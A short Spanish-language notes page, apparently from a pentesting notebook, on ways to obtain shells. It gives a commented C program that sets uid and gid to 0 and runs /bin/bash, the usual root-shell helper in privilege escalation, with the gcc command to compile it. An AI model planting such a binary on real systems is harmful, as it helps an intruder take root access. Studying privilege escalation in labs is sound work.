# Introducción:
En está sección vamos a colocar todas aquellas formas o vias de realizar shells, en diferentes lenguajes y formas:

## Lenguaje C:
Generar fichero en C para despues compilarlo en un ELF.
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0); //Trata de forzar que el uid sea 0, es decir el de root (requiere privilegios)
    setgid(0); //Trata de forzar que el grupo sea 0, es decir el de root (requiere privilegios)
    execl("/bin/bash", "bash", NULL); //Sustituye el PID actual y correo el fichero "/bin/bash" llamandolo "bash", sí es una ruta relativa ira a leer buscando "PATH"
    return 0;
}
```
- Compilarlo:
```
gcc file.c -o exec.elf
```

